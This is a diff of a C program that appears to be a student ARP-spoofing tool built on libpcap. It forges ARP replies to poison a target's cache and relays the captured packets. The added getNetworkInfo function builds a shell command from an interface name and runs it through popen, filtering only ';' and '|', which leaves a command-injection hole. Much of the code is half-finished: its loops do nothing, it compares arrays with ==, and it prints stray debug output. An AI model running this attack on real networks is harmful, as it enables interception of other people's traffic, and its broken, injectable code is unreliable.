@@ -91,7 +91,51 @@ void debug(struct eth_arp s_arp){
 	printf("arp target_mac : ");
 	for(int i=0;i<sizeof(s_arp.a.target_mac);i++)printf("%x",s_arp.a.target_mac[i]);
 	puts("");
-	printf("arp taraget_ip : %x\n",s_arp.a.target_ip);
+	printf("arp t/araget_ip : %x\n",s_arp.a.target_ip);
+}
+
+void getNetworkInfo(struct eth_arp *s_arp, char* interface) {
+	char str[100]="ifconfig ";
+	char *str_mac=" | grep ether | awk '{print $2}'";
+	char *dummy=" && ifconfig ";
+	char *str_ip= " | grep netmask | awk '{print $2}'";
+	if (strstr(interface, ";") != NULL || strstr(interface, "|") != NULL) {
+		exit(-1);
+	}
+	strcat(str, interface);
+	strcat(str, str_mac);
+	strcat(str, dummy);
+	strcat(str, interface);
+	strcat(str, str_ip);
+	FILE* fp;
+	char res[35];
+	fp = popen(str, "r");
+	if (fp == NULL) {
+		exit(-1);
+		//Exception
+	}
+	if (fgets(res, sizeof(res), fp) == NULL) {
+		exit(-1);
+		//Exception
+	}
+	int i=0;
+	for (; res[i]=='\n'; i++) {
+		if (res[i] == ':') continue;
+		// string mac --> byte mac (uint8_t [8]) conversion
+	}
+	inet_pton(AF_INET,(char *)&res[i],(uint32_t*)&s_arp->a.sender_ip);
+	printf("ip :  %x\n",(uint32_t)s_arp->a.sender_ip);
+	for (int j=strlen(res), cipher=1; j > i; j--) {
+		if (res[i] == '.') {
+			// What is it?
+			cipher = 1;
+			continue;
+		}
+		// string ip --> byte ip (uint32_t) conversion
+		cipher *= 10;
+	}
+
+	pclose(fp);
 }
 
 struct eth_arp getmac(struct eth_arp s_arp,char * dev){
@@ -171,7 +215,6 @@ int main(int argc, char* argv[]) {
 
   struct pcap_pkthdr* header;
   const u_char* packet2;
-  const u_char* packet3;
   struct eth_arp s_arp;
   pthread_t t_id;
   int res,thread_cnt,ret;
@@ -182,6 +225,7 @@ int main(int argc, char* argv[]) {
   struct t_index argvs;
 
     
+//  getNetworkInfo((struct eth_arp*)&s_arp,dev);
   s_arp = getmac(s_arp,dev);
   s_arp.a.sender_ip=getIpAddress(argv[1]);
   memcpy(s_arp.e.des_mac,"\xff\xff\xff\xff\xff\xff",6);
@@ -194,67 +238,56 @@ int main(int argc, char* argv[]) {
   	res = pcap_next_ex(handle, &header, &packet2);	
 	if (res == 0) continue;
     	if (res == -1 || res == -2) break;
-	memcpy(t_ip,packet2+28,4);
+/*	memcpy(t_ip,packet2+28,4);
 	memcpy(t_mac,packet2+22,6);
 	
-	if(memcmp((char *)t_ip,(char *)&s_arp.a.target_ip,4)!=-1){		
+	if(memcmp((char *)t_ip,(char *)&s_arp.a.target_ip,4)!=-1){
 		break;
 	}else{
 		continue;
-	}
+	}*/
+	printf("123\n");
   }
-  
   inet_pton(AF_INET,argv[2],(uint32_t*)&s_arp.a.target_ip);
   pcap_sendpacket(handle,(const u_char *)&s_arp,42);
-  
   while(1){
 	res = pcap_next_ex(handle, &header, &packet2);	
 	if (res == 0) continue;
     	if (res == -1 || res == -2) break;
-	memcpy(s_ip,packet2+28,4);
-	memcpy(s_mac,packet2+22,6);
-	
-	if(memcmp((char *)s_ip,(char *)&s_arp.a.target_ip,4)!=-1){		
-		break;
-	}else{
-		continue;
-	}
+	break;
   }
 
+  printf("125");
   s_arp.a.opcode=0x0200;
-  memcpy(s_arp.e.des_mac,s_mac,6);
-  memcpy(s_arp.a.target_mac,s_mac,6);
+  memcpy(s_arp.e.des_mac,t_mac,6);
+  memcpy(s_arp.a.target_mac,t_mac,6);
   inet_pton(AF_INET,argv[2],(uint32_t*)&s_arp.a.sender_ip);
   inet_pton(AF_INET,argv[3],(uint32_t*)&s_arp.a.target_ip);
 
-  
   thread_cnt=5;
   argvs.s_arp = s_arp;
   argvs.dev = dev;
-  if(pthread_create(&t_id,NULL,thread_main,(void *)&argvs)!=0){
-	puts("thread Error");
-	return -1;
-  }
+  //if(pthread_create(&t_id,NULL,thread_main,(void *)&argvs)!=0){
+//	puts("thread Error");
+//	return -1;
+ // }
   pcap_sendpacket(handle,(unsigned char *)&s_arp,42);
-  
   while(true){
-  	res = pcap_next_ex(handle, &header, &packet3);
-	struct eth_arp *t1=(struct eth_arp*)packet3;
+  	res = pcap_next_ex(handle, &header, &packet2);	
+	struct eth_arp *t1=(struct eth_arp*)packet2;
 	if (res == 0) continue;
     	if (res == -1 || res == -2) break;
-	if(memcmp(t1->e.des_mac,s_arp.e.src_mac,6)!=-1){
-		for(int i =0;i<6;i++){
+	if(t1->a.sender_mac==s_arp.a.target_mac){
+		for(int i =0;i<sizeof(s_arp.e.src_mac);i++){
   			t1->e.src_mac[i]=s_arp.e.src_mac[i];
 			t1->e.des_mac[i]=s_mac[i];
 		}
-		printf("----------------------\n");
 		debug(*t1);
-		printf("----------------------\n");
 		pcap_sendpacket(handle,(unsigned char *)t1,header->caplen);
 	}
   }
   
-  pthread_join(t_id,(void **)&ret);
+ // pthread_join(t_id,(void **)&ret);
   pcap_close(handle);
   printf("arp spoof Success\n");
   return 0;
